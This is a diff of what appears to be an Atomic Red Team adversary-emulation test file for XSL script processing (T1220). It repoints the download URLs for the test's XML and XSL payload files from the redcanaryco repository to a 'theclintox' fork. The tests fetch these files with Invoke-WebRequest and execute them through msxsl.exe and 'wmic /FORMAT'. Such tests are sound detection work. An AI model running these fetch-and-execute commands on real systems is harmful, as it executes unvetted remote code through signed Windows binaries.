@@ -24,14 +24,14 @@ atomic_tests:
       if (Test-Path #{xmlfile}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{xmlfile}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
+      Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1220/src/msxslxmlfile.xml" -OutFile "#{xmlfile}"
   - description: |
       XSL file must exist on disk at specified location (#{xslfile})
     prereq_command: |
       if (Test-Path #{xslfile}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{xslfile}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
+      Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1220/src/msxslscript.xsl" -OutFile "#{xslfile}"
   executor:
     command: |
       C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -46,11 +46,11 @@ atomic_tests:
     xmlfile:
       description: Remote location (URL) of the test XML file.
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
+      default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1220/src/msxslxmlfile.xml
     xslfile:
       description: Remote location (URL) of the test XSL script file.
       type: Url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
+      default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1220/src/msxslscript.xsl
   executor:
     command: |
       C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
@@ -78,7 +78,7 @@ atomic_tests:
       if (Test-Path #{local_xsl_file}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{local_xsl_file}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
+      Invoke-WebRequest "https://github.com/theclintox/atomic-red-team/raw/master/atomics/T1220/src/wmicscript.xsl" -OutFile "#{local_xsl_file}"
   executor:
     command: |
       wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
@@ -93,7 +93,7 @@ atomic_tests:
     remote_xsl_file:
       description: Remote location of an XSL payload.
       type: url
-      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
+      default: https://raw.githubusercontent.com/theclintox/atomic-red-team/master/atomics/T1220/src/wmicscript.xsl
     wmic_command:
       description: WMI command to execute using wmic.exe
       type: string
